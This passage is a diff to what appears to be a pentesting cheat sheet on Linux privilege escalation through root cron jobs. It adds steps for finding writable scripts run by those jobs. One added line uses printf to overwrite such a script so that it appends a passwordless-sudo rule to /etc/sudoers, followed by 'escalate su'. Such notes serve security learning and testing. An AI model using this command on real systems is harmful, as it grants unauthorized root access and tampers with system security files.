@@ -18,7 +18,11 @@
 - **Targeting Cron jobs that have been configured to be run as the “root” user**
 
 1. Check out crontab file `crontab -l`
-2. check out weird files and paths related to them `find / -name FILE 2>/dev/null`
+2. Check out weird files and paths related to them `find / -name FILE 2>/dev/null` or `grep -rnw DIRECTORY -e "PATH_TO_WEIRD_FILE"`
+3.  check out permissions for the scripts related to the files
+4. if there are full permissions, rewrite (No text editor ? No problem `printf '#! /bin/bash\necho "USER ALL=NOPASSWD:ALL" >> /etc/sudoers' > PATH_TO_FULL_PERM_SCRIPT`)
+5. escalate `su`
+6. BINGO
 
 ---
 # SUID Binaries
